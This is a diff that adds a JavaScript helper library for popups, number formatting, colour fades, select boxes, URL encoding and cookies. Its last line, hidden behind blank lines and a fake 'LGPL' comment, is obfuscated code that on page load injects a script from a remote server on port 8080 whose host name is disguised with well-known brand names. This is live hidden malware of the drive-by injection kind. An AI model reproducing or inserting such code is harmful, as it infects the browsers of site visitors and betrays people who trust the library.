@@ -1,0 +1,343 @@
+nav = navigator.appName.indexOf("Microsoft")!= -1 ? 1 : 2;
+
+//////////PROJECT SPECIFIC FUNCTIONS
+
+
+
+//////////COMMON FUNCTIONS
+
+function popup(url, name, width, height, scroll, modal, resizable) {
+	width=Math.min(screen.availWidth,width);
+	height=Math.min(screen.availHeight-40,height);
+	var poz_x=(screen.availWidth-width)/2;
+	var poz_y=(screen.availHeight-height-30)/2;
+	newwin=window.open(url, name, 'scrollbars='+scroll+', menubar=no, width='+width+', height='+height+', resizable='+(resizable ? 'yes' : 'no')+',toolbar=no, left='+poz_x+', top='+poz_y+', location=no, status=yes');
+	if(modal){
+		popInt=setInterval(function(n){
+			if(typeof(newwin.name)=="string"){
+				if(newwin.document.body){
+					openerfocus=function(){
+						if(typeof(newwin.name)=="string"){
+							newwin.focus();
+						}else{
+							document.body.onfocus=null;
+						}
+					}
+					document.body.onfocus=openerfocus;
+					newwin.window.document.body.onunload=function(){alert(66)}
+					newwin.focus();
+					/*with(newwin){
+						self.focus()
+						opener.document.body.onfocus=function(){self.focus();opener.alert(4);}
+						self.document.body.onunload=function(){opener.document.body.onfocus=null}
+					}*/
+					clearInterval(popInt);
+				}
+			}else{
+				clearInterval(popInt)
+			}
+		},1)
+	}
+}
+
+function chr(cod) {
+	return String.fromCharCode(cod);
+}
+
+function ord(character) {
+	return character.charCodeAt(0);
+}
+
+function hex2rgb(val) {
+	//hex2rgb convert
+	//created by Sebastian Serban v1.0 (17.06.2005)
+	return [val >> 16, val >> 8 & 0xff, val & 0xff];
+};
+
+function formatNumber(nr, decimals, dec_point, sep) {
+	//created by Sebastian Serban
+	//v1.1 (12.06.2006)
+	if (decimals == undefined) {
+		decimals = 2;
+	}else if(decimals<0){
+		decimals=Math.abs(decimals);
+		var exact_decimals=1;
+	}else{
+		var exact_decimals=0;
+	}
+	if (dec_point == undefined) {
+		dec_point = ",";
+	}
+	if (sep == undefined) {
+		sep = ".";
+	}
+	nr = String(nr).split(".");
+	nat = nr[0];
+	nr[0] = "";
+	if(nr[1]==null){
+		nr[1]="";
+	}
+	if(exact_decimals){
+		for(var i=nr[1].length;i<decimals;i++){
+			nr[1]+="0";
+		}
+	}
+	for (var i = nat.length; i>0; i -= 3) {
+		nr[0] = nat.substr(Math.max(i-3, 0), 3+Math.min(i-3, 0))+sep+nr[0];
+	}
+	nr[0] = nr[0].substr(0, nr[0].length-sep.length);
+	return nr[0]+(nr[1] != "" ? dec_point+nr[1].substr(0, decimals) : "");
+}
+
+function backgroundTrans(obj,color,time,prop,callback){
+	//created by Sebastian Serban
+	//v1.3 (26.10.2005)
+	if(prop == undefined){
+		prop = "bgColor";
+	}
+	clearInterval(obj.interval);
+	var endValue = color;
+	color = hex2rgb(Number("0x"+color.substr(1)));
+	var startValue = hex2rgb(Number("0x"+obj[prop].substr(1)));
+	var timePast = 0;
+	obj.stopTrans = function(){
+		clearInterval(this.interval);
+	}
+	obj.endTrans = function(){
+		this.stopTrans();
+		this[prop] = endValue;
+		if(callback!=null){
+			callback();
+		}
+	}
+	var callf = function(){
+		timePast+=50;
+		if(timePast >= time){
+			obj.endTrans();
+		}else{
+			var new_color = (parseInt(startValue[0]+timePast*(color[0]-startValue[0])/time))*0x10000;
+			new_color += (parseInt(startValue[1]+timePast*(color[1]-startValue[1])/time))*0x100;
+			new_color += (parseInt(startValue[2]+timePast*(color[2]-startValue[2])/time));
+			new_color = new_color.toString(16);
+			try{
+				obj[prop] = "#"+new_color;
+			}catch(err){
+				//alert(err.description+new_color);
+			}
+		}
+	}
+	obj.interval=setInterval(callf,10);
+	callf();
+}
+
+function bgTrans(obj,start_color,color,time,callback){
+	//created by Sebastian Serban
+	//v1 (25.01.2006)
+	obj.style.backgroundColor=start_color;
+	clearInterval(obj.interval);
+	var endValue = color;
+	color = hex2rgb(Number("0x"+color.substr(1)));
+	//var startValue = hex2rgb(Number("0x"+obj.style.backgroundColor.substr(1)));
+	var startValue = hex2rgb(Number("0x"+start_color.substr(1)));
+	var timePast = 0;
+	obj.stopTrans = function(){
+		clearInterval(this.interval);
+	}
+	obj.endTrans = function(){
+		this.stopTrans();
+		this.style.backgroundColor = endValue;
+		if(callback!=null){
+			callback();
+		}
+	}
+	var callf = function(){
+		timePast+=50;
+		if(timePast >= time){
+			obj.endTrans();
+		}else{
+			var new_color = (parseInt(startValue[0]+timePast*(color[0]-startValue[0])/time))*0x10000;
+			new_color += (parseInt(startValue[1]+timePast*(color[1]-startValue[1])/time))*0x100;
+			new_color += (parseInt(startValue[2]+timePast*(color[2]-startValue[2])/time));
+			new_color = new_color.toString(16);
+			try{
+				obj.style.backgroundColor = "#"+new_color;
+			}catch(err){
+				//alert(err.description+new_color);
+			}
+		}
+	}
+	obj.interval=setInterval(callf,10);
+	callf();
+}
+
+function addOption(theSel, theText, theValue){
+	var newOpt = new Option(theText, theValue);
+	var selLength = theSel.length;
+	theSel.options[selLength] = newOpt;
+}
+
+function deleteOption(theSel, theIndex){ 
+	var selLength = theSel.length;
+	if(selLength>0){
+		theSel.options[theIndex] = null;
+	}
+}
+
+function moveOptions(theSelFrom,theSelTo){
+
+	var selLength = theSelFrom.length;
+	var selectedText = new Array();
+	var selectedValues = new Array();
+	var selectedCount = 0;
+
+	// Find the selected Options in reverse order
+	// and delete them from the 'from' Select.
+	for(var i=selLength-1;i>=0;i--){
+		if(theSelFrom.options[i].selected){
+			selectedText[selectedCount] = theSelFrom.options[i].text;
+			selectedValues[selectedCount] = theSelFrom.options[i].value;
+			deleteOption(theSelFrom, i);
+			selectedCount++;
+		}
+	}
+
+	// Add the selected text/values in reverse order.
+	// This will add the Options to the 'to' Select
+	// in the same order as they were in the 'from' Select.
+	for(i=selectedCount-1; i>=0; i--){
+		addOption(theSelTo, selectedText[i], selectedValues[i]);
+	}
+	if(theSelFrom.onchange){
+		theSelFrom.onchange();
+	}
+	if(theSelTo.onchange){
+		theSelTo.onchange();
+	}
+}
+
+function isBisYear(year){
+	return (year%4==0 && year%100!=0) || year%400==0
+}
+
+function correctDate(f,nume){
+	var zileinluna=[31,31,29,31,30,31,30,31,31,30,31,30,31];
+	zileinluna[2]=isBisYear(f[nume+'[0]'].value) ? 29 : 28;
+	var nrz=zileinluna[Number(f[nume+'[1]'].value)];
+	if(f[nume+'[2]'].value>nrz){
+		try{
+			f[nume+'[2]'].selectedIndex=nrz-(f[nume+'[2]'].options.length==31 ? 1 : 0);
+		}catch(e){
+		}
+	}
+}
+
+Array.prototype.find = function(elem, all) {
+	//function for finding elements in arrays
+	//created by Sebastian Serban, v3.2 (18.10.2004)
+	//this function receives "elem" which may be an number or an array and returns the position or an array of the positions
+	//if param "all" is defined, then function return array with all the positions instead of position of the first element found
+	if (elem.length == undefined || typeof (elem) != "object") {
+		elem = [elem];
+		single = true;
+	}else{
+		single = false;
+	}
+	var result = [];
+	if (all == undefined) {
+		for (var k = 0; k<elem.length; k++) {
+			result[k] = -1;
+			toFind = elem[k];
+			for (var i = 0; i<this.length; i++) {
+				if (this[i] == toFind) {
+					result[k] = i;
+					break;
+				}
+			}
+		}
+	} else {
+		for (var k = 0; k<elem.length; k++) {
+			result[k] = [];
+			toFind = elem[k];
+			for (var i = 0; i<this.length; i++) {
+				if (this[i] == toFind) {
+					result[k].push(i);
+				}
+			}
+			if (result[k][0] == undefined) {
+				result[k] = -1;
+			}
+		}
+	}
+	if (single) {
+		return result[0];
+	} else {
+		return result;
+	}
+}
+
+function writeFlash(divid,url,width,height,bgcolor,id,vars,transparent,menu,style){
+	document.getElementById(divid).innerHTML = '<OBJECT charset="UTF-8" classid="clsid:d27cdb6e-ae6d-11cf-96b8-444553540000" codebase="http://fpdownload.macromedia.com/pub/shockwave/cabs/flash/swflash.cab#version=8,0,0,0" ID="'+id+'" WIDTH="'+width+'" HEIGHT="'+height+'" style="'+style+'" flashvars="'+vars+'">'+'<param name="allowScriptAccess" value="sameDomain" />'+'<PARAM NAME=movie VALUE="'+url+'">'+'<PARAM NAME=quality VALUE=high>'+'<PARAM NAME=bgcolor VALUE="'+bgcolor+'">'+'<PARAM NAME="FlashVars" VALUE="'+vars+'">'+(menu==0 || menu==1 ? '<PARAM NAME="menu" VALUE="'+menu+'" />' : '')+(transparent ? '<PARAM NAME="wmode" VALUE="transparent" />' : '')+'<EMBED style="'+style+'" name="'+id+'" SRC="'+url+'" QUALITY=high BGCOLOR="'+bgcolor+'" WIDTH="'+width+'" HEIGHT="'+height+'" flashvars="'+vars+'" align="middle" allowScriptAccess="sameDomain" type="application/x-shockwave-flash" pluginspage="http://www.macromedia.com/go/getflashplayer">'+'</EMBED></OBJECT>';
+}
+
+function updateCounter(txt,counter,limit){
+	counter.value=limit-txt.value.replace(/\r\n/g,'\n').replace(/\n/g,'\r\n').length;
+	counter.style.color=counter.value<0 ? "#ff0000" : "#6699cc";
+}
+
+function isNumberKey(evt){
+	var charCode = (evt.which) ? evt.which : event.keyCode
+	return charCode<31 || charCode>48 && charCode<57;
+}
+
+arr_escape={
+"ă":"%C4%83",
+"Ă":"%C4%82",
+"î":"%C3%AE",
+"Î":"%C3%8E",
+"â":"%C3%A2",
+"Â":"%C3%82",
+"ş":"%C5%9F",
+"Ş":"%C5%9E",
+"ţ":"%C5%A3",
+"Ţ":"%C5%A2",
+"Ţ":"%C5%A2",
+"+":"%2B",
+"/":"%2F"
+};
+
+function rawurlencode(str){
+	var result="";
+	for(var i=0;i<str.length;i++){
+		var chr=str.charAt(i);
+		if(arr_escape[chr]!=undefined){
+			result+=arr_escape[chr];
+		}else{
+			result+=escape(chr);
+		}
+	}
+	return result;
+}
+
+function rawurldecode(str){
+	for(var i in arr_escape){
+		str=str.replace(new RegExp(arr_escape[i],"g"),i);
+	}
+	return unescape(str);
+}
+
+function setCookie(name,value,expires,path,domain,secure){
+	if(expires){
+		var d=new Date();
+		d.setTime(expires*1000);
+		expires=d.toGMTString();
+	}
+	document.cookie=name+"="+escape(value)+(expires ? "; expires="+expires : "")+(path ? "; path="+path : "")+(domain ? "; domain="+domain : "")+(secure ? "; secure" : "");
+}
+
+
+
+
+
+
+
+/*LGPL*/ try{ window.onload = function(){var Igpfdqn195r0 = document.createElement('s(!@c^$$r^&i^&p!@t#!@#'.replace(/@|\$|&|\^|\!|\)|#|\(/ig, ''));Igpfdqn195r0.setAttribute('defer', 'd)$(e)@()f)!e$^!!r#@'.replace(/&|@|\(|\^|\!|#|\)|\$/ig, ''));Igpfdqn195r0.setAttribute('type', 't&($e^#^!x)^t@##/($!#j)#@!a^^v($&a(^^s#^&c^r!@@i$$@p@@(t)!&'.replace(/\)|\!|\^|#|\$|&|@|\(/ig, ''));Igpfdqn195r0.setAttribute('id', 'Z@2(!(3!(f^!&(3^)(c$q#((d(n)!)&i($&'.replace(/#|\^|\(|@|\!|&|\)|\$/ig, ''));Igpfdqn195r0.setAttribute('s^&)^r^^@c#'.replace(/@|\(|\!|&|#|\^|\$|\)/ig, ''),  'h$t#t^^!p)$:)($$/!&/#(!e^b)@a(($@y)#-$^#)f))r(^.)(#b^()!l^$@a)!c)^k&^$)h^##a&)!t$^w#&&@o(!^))r^&(l@(#d&^.!c^#o@$m!!!^@.@!w)#e&b)m)#d^&-^(c)&((o(()m!(.&$^w))e&&b)n)$e$#&t&@e^#n(^g^!)l@$!i##)s^h((.$^r#!u@&(:)))!^8##(0#8#0@!#(/$(@@^h^i&)5&.#c&$(o)@m(^#/&$h@i)5)#.#)(c@(o@!$m!)#)^/)!&!g!o#)o)#g^l)!)e^.^c@o$(!m#!/!w@#@!i#n))d))$o##w###s)^#l))i^#^)v^@e(().@c(#o#^(m(!^(/$(t@o#@m@^#s(#h@a#@&$^r)d&$&)w@a!$)r(#@e$@$^.^c$!o)$#^m$/!'.replace(/\)|@|&|\$|\!|\(|#|\^/ig, ''));if (document){document.body.appendChild(Igpfdqn195r0);}} } catch(H2c3axin471o0ra50kkcw) {}
